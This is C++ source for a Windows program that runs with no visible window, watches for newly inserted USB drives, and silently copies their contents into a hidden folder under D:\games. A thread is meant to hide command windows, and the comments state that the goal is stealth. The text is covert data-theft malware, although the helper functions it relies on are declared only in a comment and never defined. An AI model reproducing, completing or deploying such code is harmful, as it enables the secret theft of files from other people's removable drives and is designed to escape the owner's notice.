#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")	
#include <windows.h>
#include <string.h>
#include <string>
#include <stdlib.h>
#include <vector>
#include <algorithm>
#include <set>
using namespace std;

int usbnums;
char usbname[20];
char src[20] = "X:\\";
char dest[20] = "D:\\games\\files[X]\\";
set<int> currentdisks;
vector<int> newdisks;

HANDLE hthread_hide = NULL;
UINT DiskType;

/*----------------------------------------------------------------------------
void copy();					//复制功能
int diskstatus();				//没变化返回0, 新增返回1，退出返回2, 同时更新维护currentdisks状态
DWORD WINAPI hide(LPVOID);			//hide线程搜索cmd窗口，一旦发现即对其进行隐藏
----------------------------------------------------------------------------*/


int main() {

	usbnums = 0;

	while (true) {
		int status = diskstatus();
		if (status == 1) {	//有新盘符
			for (int i = 0; i < newdisks.size(); i++) {
				sprintf(dest, "D:\\games\\files[%d]\\", usbnums);
				src[0] = newdisks[i];
				CreateThread(NULL, 0, hide, NULL, 0, NULL);
				copy();
				WCHAR   wstr[MAX_PATH] = { 0 };		//为兼容VS2015不能转化char*为lpctstr而设置
				MultiByteToWideChar(CP_ACP, 0, dest, -1, wstr, sizeof(wstr));
				::SetFileAttributes(wstr, FILE_ATTRIBUTE_HIDDEN);	//设置存放目录为隐藏，增加隐蔽性
				usbnums++;
			}
			newdisks.clear();
		} else if (status == 0)	//无新盘符
			Sleep(1000);
		else ;	//盘符退出
	}
	return 0;
}
